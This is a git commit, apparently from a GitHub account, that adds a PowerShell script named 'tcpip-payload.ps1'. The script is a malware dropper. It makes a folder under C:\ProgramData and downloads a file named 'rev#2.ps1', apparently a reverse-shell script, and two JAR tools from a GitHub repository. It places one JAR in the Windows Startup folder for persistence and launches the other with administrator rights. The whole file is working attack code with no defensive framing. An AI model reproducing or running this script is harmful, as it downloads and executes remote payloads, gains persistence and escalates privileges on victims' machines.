b0b49b8111c1012438248f2aaf488cd80b440e7a
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2022-04-16 07:43:27 -0700

    Add files via upload

---
+++ tcpip-payload.ps1
@@ -0,0 +1,12 @@
+mkdir C:\ProgramData\zDATAxD
+cd C:\ProgramData\zDATAxD
+$source = 'https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/rev%232.ps1'
+$destination = 'C:\ProgramData\zDATAxD\rev%232.ps1'
+Invoke-WebRequest -Uri $source -OutFile $destination
+$source = 'https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/RedTools.jar'
+$destination = 'C:\ProgramData\zDATAxD\RedTools.jar'
+Invoke-WebRequest -Uri $source -OutFile $destination
+$source = 'https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/RedTools8085.jar'
+$destination = 'C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\RedTools8085.jar'
+Invoke-WebRequest -Uri $source -OutFile $destination
+Start-Process powershell -verb runas -ArgumentList C:\ProgramData\zDATAxD\RedTools.jar
